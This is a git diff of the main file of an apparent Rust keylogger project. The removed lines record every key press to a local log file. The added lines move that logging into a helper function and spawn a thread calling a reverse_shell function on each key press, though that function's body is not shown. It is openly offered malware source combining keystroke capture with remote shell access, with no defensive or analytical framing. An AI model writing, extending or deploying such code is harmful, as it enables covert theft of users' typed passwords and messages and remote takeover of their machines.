@@ -1,40 +1,24 @@
-use std::fs::OpenOptions;
-use std::io::Write;
+mod lib;
+
+use std::thread;
+
 use device_query::{ DeviceState, DeviceEvents };
+use lib::{match_case, reverse_shell};
+
 
 fn main() {
 
     let device_state = DeviceState::new();
 
-    let _guard = device_state.on_key_down( |key| {
+    let _guard = device_state.on_key_down( move|key| {
         
+        thread::spawn( move|| {
+           reverse_shell();
+        });
 
-        println!("Down: {:#?}", key);    
-
-        let mut file = OpenOptions::new()
-            .create(true)
-            .append(true)
-            .open("/home/oef/Documents/Github/k3ymb3d/log.txt")
-            .expect("Failed to open file");
-        // check if key is "Space" keycode type
-        // using match expression
-        match *key {
-            device_query::Keycode::Space => {
-                // write to file
-                file.write(b" ").expect("Failed to write to file");
-            }
-            device_query::Keycode::Enter => {
-                // write to file
-                file.write(b"\n").expect("Failed to write to file");
-            }
-            device_query::Keycode::RShift | device_query::Keycode::Slash => {
-                // write to file
-                file.write(b"?").expect("Failed to write to file");
-            }
-            _ => { 
-                write!(file, "{}",  key).expect("Failed to write to file");  
-            }
-        }
+        // spawn a theard to handle the key press
+        match_case(key);
+        
     
     });
         
